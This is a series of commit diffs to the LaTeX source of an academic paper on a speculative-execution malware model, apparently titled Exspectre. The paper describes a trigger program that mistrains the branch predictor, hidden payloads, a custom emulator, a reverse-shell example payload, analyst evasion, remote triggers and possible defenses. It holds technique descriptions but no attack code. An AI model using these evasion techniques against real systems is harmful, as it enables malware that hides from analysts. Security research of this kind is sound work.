 the trigger program starts.

### 2018-05-07 paper/payloads.tex
Read through - minor updates

@@
 function~\cite{chaitin1987computing,herken1992universal}.
-The Busy Beaver is a configuration that writes the most
-1s on the tape with only a limited number of states and still halts.
+The Busy Beaver is a configuration which writes the most
+1s on the tape before halting with a limited number of states.
 
@@
 
-Section~\ref{subsec:turing} demonstrates that arbitrary speculative computation
-is possible, but hiding malware this way has several drawbacks. First, an
+While a Turing machine demonstrates that arbitrary speculative computation
+is possible, hiding malware this way has several drawbacks. First, an
 analyst might be able to observe that something is driving a Turing
@@
 derive the decryption key based entirely off the trigger program, making it
-impossible for an analyst that only has the payload program from being able to
+impossible for an analyst that only has the payload program to
 determine the key or decrypt the embedded ciphertext.
@@
 \subsection{Virtual Machines}
-We demonstrated in Section~\ref{subsec:turing} that general purpose computation 
+We demonstrate in Section~\ref{subsec:turing} that general purpose computation 
 is possible in the speculative environment in spite of the contraints 
@@
 To accommodate both developers as well as the unique constraints 
-enforced by the speculative primitive, a custom emulation solution is required. We 
-have approached this challenge from both directions. First we demonstrate 
-general purpose emulation using a custom instruction set -- SPASM -- which
-accommodates the speculative primitive specifically. Next we investigate custom 
-wrappers on traditional emulators allow for similar payload construction,
-with a much more developer friendly
+enforced by the speculative primitive, a custom emulation solution is required. 
+we have approached this challenge by creating a custom instruction set -- 
+SPASM -- which accommodates the speculative primitive specifically. This 
+provides a higher level of abstraction around the speculative primitive
+that we have used to implement various payloads.
+
+% The assembly level abstraction that SPASM provides is still not extremely
+% user friendly as it does not allow an author to write their encrypted 
+% emulator payload in a high level language.
 

### 2018-05-07 paper/related-work.tex
Read through - minor updates

@@
 
-Many resourcess have been useful in developing the \speculake exploit 
-model.
+% Many resourcess have been useful in developing the \speculake exploit 
+% model.
 
@@
 information about the environment in which a program is running, which 
-malware has used to detect honey-pots and emulated environments.
+malware has used to detect honey-pots and emulated 
+environments~\cite{balzarotti2010efficient}.
 
@@
 IA32 architecture~\cite{bangert2013page}. Bugs like this are abundant in
-modern processors as multiple threads share system resources cooperatively
+modern processors~\cite{d2015exploiting} as multiple threads share system resources cooperatively
 and optimizations is done objectively with regards of the 
-process isolation for the most part. Accessing copoerative hardware resources is at
+process isolation for the most part~\footnote{With the exception of permission 
+rings, i.e. kernel vs user space isolation}. Accessing cooperative hardware resources is at
 the heart of the \speculake model, which constructs a hardware weird machine
@@
 by patching binaries as the speculation can only happen on "bare-metal" systems, 
-and speculative execution will not trigger debugging break-points as 
-they are never completed in a committed state.
+and the critical functionality is performed speculatively. Similarly, debugging 
+break-points wll not be triggered as instructions are never completed in a committed state.
 Symbolic execution will also fail to find a target function as it is never on the 
@@
 browser~\cite{oren2015spy,google_cache_browser},
-security critical encryption~\cite{yarom2014recovering,tromer2010efficient}
+and security critical encryption~\cite{yarom2014recovering,tromer2010efficient}
 environments, demonstrating how ubiquitous hardware side-channel exploits can be.
@@
 predictors, cache replacement policies, and reorder buffer construction including work by Matt 
-Godbolt~\cite{godbolt2016branch}, Henry Wong~\cite{measuring-rob} paved the runway for 
+Godbolt~\cite{godbolt2016branch}, and Henry Wong~\cite{measuring-rob} paved the runway for 
 dedicated branch prodiction side-channels.
@@
 Given the numerous directions that were being investigated in reverse engineering 
-Intel processors, multiple teams discovered the Spectre vulnerabilites concurrently including the 
-various teams associated with Kocher \textit{et al.}~\cite{spectre}, the Project Zero team 
+Intel processors, multiple teams discovered the Spectre vulnerabilites concurrently including 
+the teams associated with Kocher \textit{et al.}~\cite{spectre}, the Project Zero team 
 at Google~\cite{project_zero},and various others~\cite{evtyushkin2018branchscope,maisuradze2018speculose}. 
@@
 critical to processor performance and requires significant software, and hardware 
-updates to fully address. Multiple measures have been proposed to address the 
-individial variants of Spectre.  Trippel \textit{et al.} proposes a method of faithfully simulating 
-hardware bugs, such as processes cooperatively using speculating branch prediction,
-by synthesizing microarchetecture defects~\cite{trippel2018meltdownprime}. However, 
-manufacturers generally guard complete formal descriptions of processor microarchitecture closely, 
-making this a less accessible solution for the research community.
+updates to fully address. Multiple measures have been proposed to combat the 
+individial variants of Spectre.
 
@@
 
+Trippel \textit{et al.} proposes a method of faithfully simulating 
+hardware bugs, such as processes cooperatively using speculating branch prediction,
+by synthesizing microarchetecture defects~\cite{trippel2018meltdownprime}. However, 
+manufacturers generally guard complete formal descriptions of processor microarchitecture closely, 
+making this a less accessible solution for the research community.
+
 \smallskip

### 2018-05-07 paper/figures.tex
Read through - minor updates
add caption for high-level

@@
     \includegraphics[width=0.9\linewidth]{figures/exspectre-high-level-trimmed.pdf}
-    \caption{\textbf{Exspectre}\,---\, %
-    1, 2, 3, 4...}
+    \caption{\textbf{\speculake}\,---\,%
+    Both the Trigger and Payload binaries exhibit the same initial series of
+    indirect jumps, shown in Step 1. The trigger program solely executes these
+    jumps to (mis)train the branch predictor. In the Payload program
+    \texttt{fn\_ptr} has been set to point to the \texttt{cache\_timing}
+    function and flushed from cache. Thus at Step 2 the branch predictor
+    mis-predicts the jump to \texttt{cache\_timing} and instead jumps to
+    \texttt{target\_fn} as trained by the Trigger program (green line). 
+    \texttt{target\_fn} then executes speculatively as shown in Step 3. 
+    Eventually \texttt{fn\_ptr} is loaded from memory and this mis-jump is 
+    recognized by the processor, directing computation to Step 4, the 
+    \texttt{cache\_timing} function, which then computes which value was loaded 
+    into cache speculatively.}
 
@@
 \newcommand{\FigCacheMiss}{
-\begin{figure}[h]
+\begin{figure}[t]
     \centering

### 2018-05-07 paper/architecture.tex
added target fn requirements to speculative limitations

@@
 
+\subsubsection{Target Function Requirements}
+The benefits of \speculake rely on the computation performed in the
+speculative function being well hidden. To this end we have verified 
+certain requirements about the locations that a target function can 
+be placed.
+
+First and foremost the target function must be in the instruction cache. 
+This does not require that the function is ever run, only loaded. We have 
+found that this is not a large barrier to overcome as Intel 
+processors aggressively prefetch cache pages~\cite{measuring-cache}
+and simple access patterns could be established to ensure
+that the required block(s) are accessible.
+
+We have also confirmed that all speculative target code in the payload  
+must be stored in executable pages, and that it cannot be stord in non-executable 
+data sections.  We suspect that this is again due to caching. The processor
+has no reason to cache instructions stored in the data section in the 
+instruction cache. If a trigger trains the branch predictor 
+to jump to an address in the payload's data section, the payload will not 
+be able to fetch the instructions into the execution pipeline.
+
 \subsubsection{Hyperthreading}

### 2018-05-07 paper/introduction.tex
add references for spectre

@@
 indirect jumps and measures a cache side channel. While the trigger program is
-not running, the payload program is effectively inactive (and may optionally do some
-decoy operation). When the trigger program runs, it executes a similar pattern of
-indirect jumps (with similar source and destination addresses as the payload
-program), effectively training the CPU's branch predictor to the jump pattern
-specified by the trigger program.
+not running, the payload program is effectively inactive (and may optionally do
+some decoy operation). When the trigger program runs, it executes a similar
+pattern of indirect jumps (with similar source and destination addresses as the
+payload program), effectively training the CPU's branch predictor to the jump
+pattern specified by the trigger program.
 
-Importantly, the trigger program and payload
-program's indirect jump patterns diverge on the destination of their final jumps.
-However, because the trigger program has trained the CPU's branch predictor, the
-CPU speculates that the payload program will continue following the pattern of
-the trigger program, causing it to speculatively execute a
-\emph{target function} in the payload program. We emphasize that this target
-function is in a region that is neither read nor executed by the payload
-program, and after the CPU discovers the mis-speculation in the payload program,
-it will discard the results from the target function and continue executing from
-the correct destination. However, the payload program has a limited speculative
-window where it can perform computation in the target function, and can
-communicate results back to the ``real world'' payload program via a cache side
-channel.
+Importantly, the trigger program and payload program's indirect jump patterns
+diverge on the destination of their final jumps. However, because the trigger
+program has trained the CPU's branch predictor, the CPU speculates that the
+payload program will continue following the pattern of the trigger program,
+causing it to speculatively execute a \emph{target function} in the payload
+program. This execution path is shown in Figure~\ref{fig:high-level}.
+
+We emphasize that this target function is in a region that is neither
+read nor executed by the payload program, and after the CPU discovers the
+mis-speculation in the payload program, it will discard the results from the
+target function and continue executing from the correct destination. However,
+the payload program has a limited speculative window where it can perform
+computation in the target function, and can communicate results back to the
+``real world'' payload program via a cache side channel.
 
@@
 In order to study the potential of \speculake, we implement several example
-payload programs and evaluate their performance.
-We find that the speculative window is limited by the reorder buffer
-and physical register file sizes, which allows us to execute between 100 and 200 instructions
-speculatively on modern Intel CPUs. While brief, we are able to perform
-execution in short steps, communicating intermediate results back to the ``real
-world'' part of the payload program. Using this technique,
-we demonstrate implementing a universal Turing machine
-(demonstrating arbitrary computation), a custom instruction set architecture
-that fits within the constraints of speculative execution, and show
-the ability to perform AES decryption
-of a payload via AES encrypt/decrypt instructions.
+payload programs and evaluate their performance. We find that the speculative
+window is limited by the reorder buffer and physical register file sizes, which
+allows us to execute between 100 and 200 instructions speculatively on modern
+Intel CPUs. While brief, we are able to perform execution in short steps,
+communicating intermediate results back to the ``real world'' part of the
+payload program. Using this technique, we demonstrate implementing a universal
+Turing machine (demonstrating arbitrary computation), a custom instruction set
+architecture that fits within the constraints of speculative execution, and show
+the ability to perform AES decryption of a text block via AES encrypt/decrypt
+instructions.
 

### 2018-05-07 paper/appendix_spasm.tex
quick typo fix

@@
 functional registers, PTR and VAL, and a stack. This instruction set has been 
-designed to be emulated in x86 and x86-64 environments, though the emulator 
+designed to be emulated in x86 and x86\_64 environments, though the emulator 
 could be implemented to run on other systems.

### 2018-05-07 paper/architecture.tex
typos and wording fixes

@@
 
-\speculake malware is comprised of two independent programs: a payload program, and a
-trigger program. Both are installed on the victim's computer (e.g. via trojan, remote
-exploit, or phishing), and must run simultaenously on the same physical CPU. We
-note that the constraint of running programs on the same CPU is not a signifcant
-burden: \texttt{taskset} can be used to limit a process to a core, or if not
-available, the attacker can simply run multiple copies of the trigger or payload
-program to coerce the OS scheduler to assign a payload/trigger pair to the same
-core.
+\speculake malware is comprised of two independent programs: a payload program,
+and a trigger program. Both are installed on the victim's computer (e.g. via
+trojan, remote exploit, or phishing), and must run simultaenously on the same
+physical CPU. We note that the constraint of running programs on the same CPU is
+not a signifcant burden: \texttt{taskset} can be used to limit a process to a
+core, or if not available, the attacker can simply run multiple copies of the
+trigger or payload program to coerce the OS scheduler to assign a
+payload/trigger pair to the same core.
 
@@
 In \speculake, we cause the CPU to mis-speculate the destination of an indirect
-branch in the payload program, causing it to speculatively execute from an
-instruction that is never truly executed. We term this speculative destination the
-\emph{speculative entry point}.
-\speculake uses indirect jumps to allow speculatively executing from \emph{any}
-instruction in the payload process' address space. Because it can jump to any
-instruction, the malware analyst has a difficult task in determining where a
-payload program's speculative entry point is.
+branch in the payload program, causing it to speculatively execute 
+instructions that are never truly executed. We term this speculative destination
+the \emph{speculative entry point}. \speculake uses indirect jumps to allow
+speculatively executing from \emph{any} instruction in the payload process'
+address space. Because it can jump to any instruction, the malware analyst has a
+difficult task in determining where a payload program's speculative entry point
+is.
 
@@
 This forces the CPU to predict the destination of the indirect call while it
-waits for the function pointer to load from memory. Due to the similarity
+waits for the function pointer to load from memory. Due to the similar
 history of branches with the trigger program,
@@
 will be resolved, and the CPU will recognize it has incorrectly predicted the
-destination of its \texttt{callq} instruction. The results from the speculative
-entry point instructions will be discarded, and the CPU will continue executing
-from the correct destination. However, as the speculative code changes what is
-loaded into the cache based on its results, it can covertly communicate its
-results to the ``real world'' program.
+destination of its \texttt{callq}/\texttt{jmpq}/\texttt{retq} instruction. The
+results from the speculative entry point instructions will be discarded, and the
+CPU will continue executing from the correct destination. However, as the
+speculative code changes what is loaded into the cache based on its results, it
+can covertly communicate its results to the ``real world'' program.
 
@@
 Figure~\ref{fig:cache-miss} shows the CDF of cycles taken. In the typical case,
-an evicted item takes approximately 300 clock cycles to load from L3, which
+an evicted item takes approximately 300 clock cycles to load from the Level 3 cache (L3), which
 would allow a limit of roughly 200 speculative instructions to be
@@
 We also measured the capacity of the reorder buffer (ROB) using a method
-outlined by~\cite{measuring-rob}. We measure the maximum number of cycles taken to
-perform two uncached memory reads, and vary the number of filler instructions
+outlined by~\cite{measuring-rob}. We measure the maximum number of cycles taken
+to perform two uncached memory reads, and vary the number of filler instructions
 between them. If the number of filler instructions is small, both memory reads
-will fit inside the ROB, and can issue their memory reads in parallel. However,
-if the filler instructions fill the ROB, the second memory read will have to
-wait for the first to return before it can be issued, causing a noticeable step
-increase in the cycle count.
-Figure~\ref{fig:spec-capacity}
+will fit inside the ROB, and it can issue their memory reads in parallel.
+However, if the filler instructions fill the ROB, the second memory read will
+have to wait for the first to return before it can be issued, causing a
+noticeable step increase in the cycle count. Figure~\ref{fig:spec-capacity}
 shows this step occurs at approximately 220 instructions for our processor,
@@
 
-To verify the upper limit of speculative instructions,
-we instrumented our trigger and payload programs to test a variable-length target
-function before it communicated a signal to the real world via a cache side
-channel. If the cache side channel revealed no signal in the real world, then we know the
-speculative execution did not make it to the signal instructions before the
-mis-speculated branch was resolved.
+To verify the upper limit of speculative instructions, we instrumented our
+trigger and payload programs to test a variable-length target function before it
+communicated a signal to the real world via a cache side channel. If the cache
+side channel revealed no signal in the real world, then we know the speculative
+execution did not make it to the signal instructions before the mis-speculated
+branch was resolved.
 
-We also tested whether instruction complexity or data dependencies impact
-the number of instructions that can be completed. We find that data dependencies
-and instruction complexity both have an impact on the number of instructions
-that can be executed. Instruction complexity is determined by the number of
-$\mu$ ops that the instruction uses, which appears to be what is tracked in the ROB.
-For instance, on our architecture, the 64-bit \texttt{idiv} instruction takes 59
+We also tested whether instruction complexity or data dependencies impact the
+number of instructions that can be completed. We find that data dependencies and
+instruction complexity both have an impact on the number of instructions that
+can be executed. Instruction complexity is determined by the number of $\mu$ ops
+that the instruction uses, which appears to be what is tracked in the ROB. For
+instance, on our architecture, the 64-bit \texttt{idiv} instruction takes 59
 $\mu$ ops, and we can execute up to 3 of them in the speculative world.
@@
 
-We found that the processor can identify
-some operations that have no effect on output registers and allows them to use the 
-entire size provided by the ROB, as determined in section~\ref{sssec:ROB}. This includes 
-idomatic no-ops and zero idioms, which have no reliance on register values, 
-for example the instruction \texttt{xchg \%rax \%rax} and \texttt{xor \%rax, \%rax}. 
-However, if an instruction is a potential data hazard, it must use an entry in the PRF
-until it reaches the correct stage in the execution pipeline. In this case, the number 
-of instructions could be limited by the PRF entries available.
+We found that the processor can identify some operations that have no effect on
+output registers and allows them to use the entire size provided by the ROB, as
+determined in Section~\ref{sssec:ROB}. This includes idomatic no-ops and zero
+idioms, which have no reliance on register values, for example the instruction
+\texttt{xchg \%rax, \%rax} and \texttt{xor \%rax, \%rax}. However, if an
+instruction is a potential data hazard, it must use an entry in the PRF until it
+reaches the correct stage in the execution pipeline. In this case, the number of
+instructions could be limited by the PRF entries available.
 
@@
 
-Most notably instructions that use the extended x86 registers are still
-valid within the speculative context. Specifically, Intel's hardware accelerated AES-NI
-encryption and decryption instructions, which each use 128-bit registers.
-As shown in Figure~\ref{fig:spec-capacity}, speculative environments can complete
-a significant number of AES rounds -- more than enough to decrypt a full block 
-using AES-CBC. We investigate the use of AES instructions in the spculative environment
-further in Sections~\ref{subsec:decryption}.
+Most notably instructions that use the extended x86 registers are still valid
+within the speculative context. Specifically, Intel's hardware accelerated
+AES-NI encryption and decryption instructions, which each use 128-bit registers.
+As shown in Figure~\ref{fig:spec-capacity}, speculative environments can
+complete a significant number of AES rounds -- more than enough to decrypt a
+full block using AES-CBC. We investigate the use of AES instructions in the
+spculative environment further in Sections~\ref{subsec:decryption}.
 
@@
 
-We have also confirmed that all speculative target code in the payload  
-must be stored in executable pages, and that it cannot be stord in non-executable 
-data sections.  We suspect that this is again due to caching. The processor
-has no reason to cache instructions stored in the data section in the 
-instruction cache. If a trigger trains the branch predictor 
-to jump to an address in the payload's data section, the payload will not 
-be able to fetch the instructions into the execution pipeline.
+We have also confirmed that all speculative target code in the payload must be
+stored in executable pages, and that it cannot be stored in non-executable data
+sections.  We suspect that this is again due to caching. The processor has no
+reason to cache instructions stored in the data section in the instruction
+cache. If a trigger trains the branch predictor to jump to an address in the
+payload's data section, the payload will not be able to fetch the instructions
+into the execution pipeline.
 

### 2018-05-07 paper/implementation.tex
VM implementation updates

@@
 \subsection{Virtual Machine}
+\label{subsec:spasm}
 
-\subsubsection{SPASM}
-\label{subsubsec:spasm}
+% \subsubsection{SPASM}
+% \label{subsubsec:spasm}
 Constructing an emulator making use of the speculative primitive requires  
@@
 aditional bit doubles the search space that the \texttt{Flush+Reload} stage must 
-traverse.  So every bit shorted effectively doubles the throughput of the 
+traverse.  So every bit shorter effectively doubles the throughput of the 
 emulator, and there is effectively no advantage to allowing variable length 
-instructions.
+instructions. Details of the SPASM instruction set can be found in 
+Appendix~\ref{appendix:spasm}.
 
 Using this model we have implemented multiple example programs that can be run
-as encrypted payloads in an \speculake payload. A \textit{HelloWorld} program 
+as encrypted binaries in an \speculake payload. A \textit{HelloWorld} program 
 that prints to stdout. A \textit{FizzBuzz} program that demonstrates control 
@@
 a \textit{ReverseShell} program that opens and connects to a socket before  
-duplicating I/O and executing a local shell.
+duplicating I/O file descriptors and executing a local shell.
 
@@
 has been identified in the indicess returned from the "speculative world". 
-Thus accomplishing a task using SPASM generally equates to:
+%Thus accomplishing a task using SPASM generally equates to:
 
-\begin{lstlisting}
-    Redundancy * Probe_Space * Num_Instr
-\end{lstlisting}
+% \begin{lstlisting}
+%     Redundancy * Probe_Space * Num_Instr
+% \end{lstlisting}
 
 For example, the \textit{ReverseShell} program makes six system calls to open a socket,
-connect to it, duplicate I/O, and execve a specified program. This requires 355
-SPASM instructions to complete. The probe space for the 6-bit SPASM ISA requires 
-a traversal of an array od size 64. When using a redundancy of 256 to establish
-confidence in the signal the entire \textit{ReverseShell} program takes under 7 
-seconds to run once triggered.
+connect to it, duplicate I/O file descriptors, and perform an execve
+systemcall to open a shell. This requires 355 SPASM instructions to complete. 
+The probe space for the 6-bit SPASM ISA requires a traversal of an array of size 64.
+When using a redundancy of 256 to establish confidence in the signal the entire 
+\textit{ReverseShell} program takes under 7 seconds to run once triggered.
+
+% TODO - REFERENCE APPENDIX for ISA
 
 \FigSpasmModel
-
-\subsubsection{ARM}
-\label{subsubsec:arm}
-While the custom emulator that we developed gives a much higher level abstraction to 
-a developer, it still requires programs to be written in custom assembly 
-language. To demonstrate that the extensibility of this model we also implemeted a wrapper
-around an ARM emulator, such that programs can be written in a high level languages 
-such as C or C++, statically compiled to binaries for the ARM emulator, and deployed 
-as an encrypted data sections to be decrypted at run-time.
-
-% ARM Wrapper
-%   - memory
-%   - single instruction vs block
-
-We chose to implement a wrapper around ARM as it has a 32-bit fixed instruction
-length. However this causes a significant hit to the speed at which operations 
-can be performed as the probe space is increased by a factor of four in 
-comparison with SPASM,  and we must complete 4 of these transactions to 
-retreive a single ARM opcode. Trading more expressive operations for speed
-results in a 16x slowdown when considering per-instruction throughput.
-
-\begin{lstlisting}
-    4 * Redundancy * Probe_Space * Num_Instr
-\end{lstlisting}
 

### 2018-05-07 paper/payloads.tex
VM implementation updates

@@
 enforced by the speculative primitive, a custom emulation solution is required. 
-we have approached this challenge by creating a custom instruction set -- 
-SPASM -- which accommodates the speculative primitive specifically. This 
+We have created a custom emulator and instruction set -- SPASM -- which 
+accommodate the speculative primitive specifically. This 
 provides a higher level of abstraction around the speculative primitive
-that we have used to implement various payloads.
+that we have used to implement various executable binaries.
 
@@
 
-% REFERENCE FIGURES
-% - Constraints enforced by speculative primitive
-%       - more bits = slower
-%       - less bits = less expressive
-%       - must be computable within speculative ROB limit (~150 instrs) (decrypt only)
-%   
-% - optimizations for weird-machine computations
-
-% --- VM
-%   - Wrappers around traditional ISA VMs
-%   - SPASM  custom emulator made f
-%%%%%%%%%%%%%%
+While the custom emulator that we developed gives higher level abstraction to
+an author, it still requires programs to be written in a custom assembly language. 
+We note that the \speculake model is not intrinsically linked to the SPASM emulator. 
+A wrapper could be implemented around other existing emulators to incrementally 
+construct instructions 6 or 8 bits at a time (depending on the channel width). 
+This would allow for encrypted payloads to be written in higher level languages
+like C or C++, although there would be a significant performance reduction to 
+using this type of wrapper.

### 2018-05-07 paper/figures.tex
update captions
VM implementation updates

@@
         to be completed speculatively, dependent on multiple factors. Trigger and 
-        payload processes must share cpu resources as they must be performed on 
+        payload processes must share CPU resources as they must be performed on 
         the same hyperthread or associated parity hyperthreads. Processes on
@@
     \includegraphics[width=0.5\textwidth]{figures/cache_miss_dist}
-    \caption{Cache Hit/Miss Latency Distribution}
+    \caption{The Cache Hit/Miss Latency Distribution of an Intel
+        Xeon-1270. Measured by timing accesses to cached/uncached memory. 
+        Typical cache miss resolution takes 6x longer than a cache hit.}
     \label{fig:cache-miss}

### 2018-05-07 paper/payloads.tex
typos and wording fixes

--- 2018-05-07 paper/payloads.tex
@@
 We demonstrate in Section~\ref{subsec:turing} that general purpose computation 
-is possible in the speculative environment in spite of the contraints 
-imposed by the speculative world. However, a turing machine
+is possible in the speculative environment in spite of the constraints 
+imposed by the speculative world. However, a Turing Machine
 is not an efficient or usable model for computation when
@@
 enforced by the speculative primitive, a custom emulation solution is required. 
-we have approached this challenge by creating a custom instruction set -- 
-SPASM -- which accommodates the speculative primitive specifically. This 
+we have approached this challenge by creating a custom instruction set---
+SPASM---which accommodates the speculative primitive specifically. This 
 provides a higher level of abstraction around the speculative primitive

### 2018-05-07 paper/implementation.tex
section intro

@@
 \section{Implementation and Evaluation}
+We now discuss the details of our implementations and the information learned
+about speculative execution gained by these experiments. We discuss how we gain
+confidence in information passed back, and how a low number of iterations is
+sufficient to gain a strong confidence in results.
 

### 2018-05-07 paper/implementation.tex
add speculating on data

@@
 speculative execution must be in separate cache lines.
+
+If the state is removed from cache, during the speculative execution the
+state is also speculated. This error is particularly devious, as it is not an
+error of bit flips, but rather the processor speculating what the state could
+be, meaning that the state it uses is a possible value, and is not simply a
+mutation.
 

### 2018-05-08 paper/payloads.tex
Expanded SPASM VM and reorganized nested speculation sections

@@
 
-We note that an analyst might attempt to locate the speculative entry point by
-searching for AES-NI instructions in the payload program's dead code, ultimately
-discovering the keys that it uses. However, we find it is possible to overcome
-this by having the trigger program communicate the decryption key to the payload
-program via the branch predictor.
+\subsubsection{Nested Speculation}
 
-To accomplish this, we use multiple speculative entry points, each that derive a
-different decryption key before calling a common decryption routine. Since
-the exact speculative entry point is determined by the trigger program, an
-analyst cannot discover the decryption key directly from the payload program.
+We explore the ability for the CPU to ``double speculate'', where a stalled
+indirect jump while the CPU is speculating causes it to predict the target and
+speculate a second time. For instance, suppose a payload program truly jumps to
+target A, but the CPU is mistrained by a trigger program that jumps to B, thus
+causing the payload program to speculatively execute at B. At B, suppose there
+is a second indirect jump, perhaps using the same register as the first jump
+(which has still not resolved). If the trigger program jumps to C, the payload
+program will speculate a second time and also begin executing code at C.
 
-An analyst could still enumerate all potential entry points, testing each one
-until they find one that correctly decrypts the ciphertext. In a 1~MB binary,
-there are (at most) only 1~million entry points, providing just 20~bits of
-security.
-
-To increase security, we \emph{chain} entry points together. Rather than derive
-the key from a single entry point, we have each potential entry point perform
-another indirect jump that the CPU cannot immediately resolve, forcing it to
-speculate while already executing speculatively. The predicted target of that jump
-will also be determined by the trigger program. For example, if the trigger
-program makes 30 training jumps, followed by 10 additional indirect jumps, and
-the payload program performs the same 30 training jumps before a stall, the CPU
-will predict the payload program will also perform the next 10 jumps. If each
-jump has the potential to land in up to 1024 possible locations, this would
-provide in total $1024^{10} = 2^{100}$ possible keys, or 100~bits of security.
-We describe our implementation of this nested speculative execution concept in
-Section~\ref{subsec:nested-spec}.
+We find that not all Intel CPUs support nested speculation. For
+example, it appears Haswell chips do not speculate while already speculating,
+but nonetheless support non-nested \speculake. Both Sandy Bridge (which
+preceeded Haswell) and Kaby Lake (which followed Haswell) support nested
+speculation.
+% Could cut
+We leverage this support in Section~\ref{subsec:decryption} to
+increase the security of speculative decryption keys.
 

### 2018-05-08 paper/discussion.tex
Added spectre-NG mention and pass on future work

@@
 
-%\subsubsection{Full Whitebox Cryptography}
-%To make it difficult to extract the key schedule used to decrypt the ciphertext,
-%we can preload a large block of random data, and have multiple speculative entry
-%points, each that choose a different index into the random data to be used as
-%the key schedule, and then jumps to a common decryption routine. This way, the exact
-%speculative entry point determines the key used for decryption. Because the
-%exact speculative entry point is determined by the trigger program, an analyst
-%cannot discover the decryption key directly from the payload program.
-%
-%An analyst could enumerate potential entry points, and test each one
-%until they find one that correctly decrypts the ciphertext. In a 1~MB binary,
-%there are (at most) only about 1~million entry points, providing just 20~bits of
-%security.
-%
-%To increase security, we could \emph{chain} entry points together. Rather than
-%derive the index from the entry point, we have each potential entry point perform
-%another indirect jump that the CPU cannot immediately resolve, forcing it to 
-%speculate, inside the speculative world. The predicted
-%target of that jump will also be determined by the trigger program. For
-%instance, if the trigger program makes 30 training jumps, followed by 10
-%additional jumps, the payload program will follow all 40 jumps, with the
-%locations of the last 10 jumps used to determine the key index information.
-%If each jump could land in up to 1024 possible locations, this would provide in
-%total $1024^10 = 2^100$ possible keys, or 100~bits of security.
-%
-%A payload can still be crafted to use a benign program, given that it 
-%implements a sufficient series of jumps. Even if a reverse engineer 
-%gets to watch the program run they will only find out the plain text 
-%and not the key schedule as any attempts to observe the decryption 
-%process will interfere with the speculative branching. The reverse enginner 
-%must either identify the exact process that was running concurently 
-%which trained the branch predictor, or identify the correct series of 
-%jumps taken speculatively to derive the key schedule. 
-%
-%We believe that the state explosion provided in both of these scenarios 
-%presents new and difficult challenges for reverse engineers.
+This work demonstrates a general model for hiding execution in 
+the speculative world and examines the implications and limitations on 
+Intel processors. Given the wide-spread nature of the Spectre vulnerability 
+and the ubiquity of cache side-channels we believe that this work can 
+be directly extended to AMD, ARM, and other processors making use of
+speculative branch prediction.
 
 \subsubsection{Multiple Triggers}
-To create further difficulties for a reverse engineer, or to further target
+To create further difficulties for an analyst, or to further target
 the execution environment it is possible
@@
 process can then be done in stages where the result of a given stage determines 
-the initial state of the next decryption stage that the payload program 
+the initial state of the next stage that the payload program 
 performs. Only when all triggers have been completed in the correct order will
@@
 
+\smallskip
+
+Alternatively multiple triggers could be used make individual state changes in
+the payload program, and write in data from a local, or (as demonstrated in 
+section~\ref{subsec:nested-spec}) remote processes. For example, a payload program
+can check a series of three distinct jump patterns corresponding to three different 
+triggers. If the first trigger is detected the payload shifts in a 1 to the state; if
+the second is detected it shifts in a 0. If the third trigger is detected it 
+discontinues listening to the three triggers and proceeds with other computation. 
+This could be a direct form of \speculake using emulation and decryption 
+or more traditional malicious behavior. Using this method a payload program can
+be distributed without the encrypted data section all together, instead having 
+the data written into the process at run-time without ever connecting out to any 
+other resource.
+
+\subsubsection{Benign Triggers}
+We have demonstrated that a using OpenSSL as a benign trigger allows for 
+\speculake payloads to be triggered remotely, and discussed the minimum 
+requirements for identifying a benign trigger. However, we have not classified
+typical system resources that might be used a benign triggers. This is a 
+promising direction for future investigation as various system libraries present 
+juicy targets for trigger design. For exmaple, if a sufficient series of jumps 
+is found to exist in the TCP stack implemented in the unix kernel (i.e. in the TCP
+Checksum library) an attacker could reasonably trigger a \speculake payload remotely,
+from a spoofed IP address. This attack would rely on a payload defeating KASLR, 
+however, this has been demonstrated to be feasible~\cite{gruss2017kaslr,evtyushkin2016jump}
+
+\subsubsection{Alternative Applications}
+We have proposed the \speculake model as a new malware threat, however, this model
+of hidden computation applies more broadly. As of now there are no ways of 
+debugging speculative computation meaning that the computation done there is effectively
+isolated as with trusted execution environments. The security provided by the obfuscated 
+key schedule makes \speculake useful in the domains of Digital Rights Management (DRM)
+and whoitebox cryptography more generally. 
+%% Approximate Computing
+
 %%%%%%%%%%%%%%

### 2018-05-08 paper/architecture.tex

@@
 
-\subsubsection{Nested Speculation}
-
-We explore the ability for the CPU to ``double speculate'', where a stalled
-indirect jump while the CPU is speculating causes it to predict the target and
-speculate a second time. For instance, suppose a payload program truly jumps to
-target A, but the CPU is mistrained by a trigger program that jumps to B, thus
-causing the payload program to speculatively execute at B. At B, suppose there
-is a second indirect jump, perhaps using the same register as the first jump
-(which has still not resolved). If the trigger program jumps to C, the payload
-program will speculate a second time and also begin executing code at C.
-
-We find that not all Intel CPUs support nested speculation. For
-example, it appears Haswell chips do not speculate while already speculating,
-but nonetheless support non-nested \speculake. Both Sandy Bridge (which
-preceeded Haswell) and Kaby Lake (which followed Haswell) support nested
-speculation.
-% Could cut
-We leverage this support in Section~\ref{subsec:decryption} to
-increase the security of speculative decryption keys.
-
 \subsection{Speculative Primitive}

### 2018-05-08 paper/discussion.tex

@@
 
-%TODO: This is a defense to Spectre, but not to Exspectre...
-\subsubsection{SpecFence}
-The \texttt{mfence} instruction requires that instructions earlier in the code
-be retired before instructions after it. This ensures that memory is loaded and
-stored in a particular order (in the real world). However, the \texttt{mfence}
-instruction can be speculated past, meaning that caches can be affected
-out-of-order even with this instruction.
+\subsubsection{Operating System Defenses}
+One defense to limit the capabilities of \speculake is to introduce privileged
+instructions that grant the Operating System more control.
 
-One possible defense against \speculake is the introduction of a new
-instruction: \texttt{specfence} which designates to the CPU a point that cannot 
-be speculated past. This would require that loads/stores after the 
-\texttt{specfence} instruction would be on hold until loads/stores from before
-the \texttt{specfence} instruction have retired. Note the subtle difference from
-\texttt{mfence}, we not only require that the loads/stores before a
-\texttt{specfence} retire ahead of the loads/stores after the 
-\texttt{specfence}, but more strongly: the loads/stores after a 
-\texttt{specfence} do not begin to execute at all until the loads/stores before
-the \texttt{specfence} retire.
+A necessary component of \speculake is the ability of a process to affect the
+Branch History Buffer (BHB), which is used by all processes, allowing programs
+to affect how separate programs choose to make indirect jumps.
 
-This would possibly require a set of new API instructions in most basic
-libraries allowing for functions that ensure no speculation (for security, no
-data is leaked, no mystery instructions are run) and a separate set of functions
-(as exist now) which allow speculation to occur (for performance, no sensitive
-data is at risk).
+To address this a new set of instructions allowing the OS to set and clear the
+Branch History Buffer on context switches allows for processes to maintain a
+useful branch history while disabling other processes from affecting their jump
+decisions.
 
-We note that this instruction seems to already exist, albeit unintentionally.
